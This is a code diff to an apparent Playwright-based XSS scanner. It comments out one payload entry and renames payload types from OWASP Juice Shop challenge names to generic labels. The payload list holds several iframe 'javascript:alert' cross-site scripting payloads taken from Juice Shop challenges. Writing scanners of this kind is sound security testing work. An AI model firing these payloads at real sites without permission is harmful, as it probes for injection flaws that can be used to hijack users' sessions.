@@ -62,14 +62,14 @@ class PlaywrightXSSScanner(BaseScanner):
             
             # DOM XSS - Juice Shop search field (iframe src)
             # Challenge: "Perform a DOM XSS attack with <iframe src="javascript:alert(`xss`)">."
-            {
-                "payload": f'<iframe src="javascript:alert(`{marker}_JS1`)">',
-                "type": "juiceshop_dom_xss_iframe",
-                "marker": f"{marker}_JS1"
-            },
+            # {
+            #     "payload": f'<iframe src="javascript:alert(`{marker}_JS1`)">',
+            #     "type": "dom_xss_iframe",
+            #     "marker": f"{marker}_JS1"
+            # },
             {
                 "payload": '<iframe src="javascript:alert(`xss`)">',
-                "type": "juiceshop_dom_xss_iframe_exact",
+                "type": "dom_xss_iframe",
                 "marker": "xss"
             },
             
@@ -77,7 +77,7 @@ class PlaywrightXSSScanner(BaseScanner):
             # Challenge: "Perform a reflected XSS attack with <iframe src="javascript:alert(`xss`)">."
             {
                 "payload": f'<iframe src="javascript:alert(`{marker}_JS2`)">',
-                "type": "juiceshop_reflected_xss",
+                "type": "reflected_xss",
                 "marker": f"{marker}_JS2"
             },
             
@@ -85,7 +85,7 @@ class PlaywrightXSSScanner(BaseScanner):
             # Challenge: "Use the bonus payload <iframe width="100%" height="166"..."
             {
                 "payload": f'<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="javascript:alert(`{marker}_JS3`)"></iframe>',
-                "type": "juiceshop_bonus_xss",
+                "type": "dom_xss",
                 "marker": f"{marker}_JS3"
             },
             
